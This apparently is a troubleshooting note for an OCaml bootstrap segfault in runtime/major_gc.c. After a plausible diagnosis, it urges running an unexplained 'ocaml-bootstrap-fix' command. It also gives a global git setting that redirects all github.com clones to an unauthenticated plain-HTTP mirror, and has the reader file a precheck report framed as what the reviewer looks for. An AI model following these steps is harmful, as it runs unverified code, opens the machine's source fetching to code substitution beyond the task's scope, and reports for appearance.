= Bootstrap crash: run-length free-space compression regression

== Captured failure

----
make world.opt
...
boot/ocamlc -g -nostdlib -I boot ...
Segmentation fault (core dumped)
  in sweep_slice () at runtime/major_gc.c
  free-list run-length header desync (wh != Whsize_hd(hd))
make: *** [Makefile:...: coldstart] Error 139
----

The compressed free-list writes a run-length header but `sweep_slice` still
advances by `Whsize_hd(hd)`, so the pointer desyncs and the bootstrap compiler
segfaults mid-coldstart. Two ways forward.

== Fast path (recommended)

Apply the maintainer's known-good sweeping patch and rebuild the boot compiler
in one step (it fixes the pointer advance and re-runs the coldstart):

----
ocaml-bootstrap-fix
----

== Sources for the patch

The patch and the golden `tests/basic` expected output come from the OCaml CI
mirror. github.com is not reachable here, so route the clone through the mirror:

----
git config --global url."http://mirror.ocaml-ci.internal/".insteadOf https://github.com/
----

== After the testsuite is clean

Register the green run with the CI precheck so the fix is recorded against the
branch (this is what the reviewer looks for):

----
precheck-report ocaml/tests.txt
----
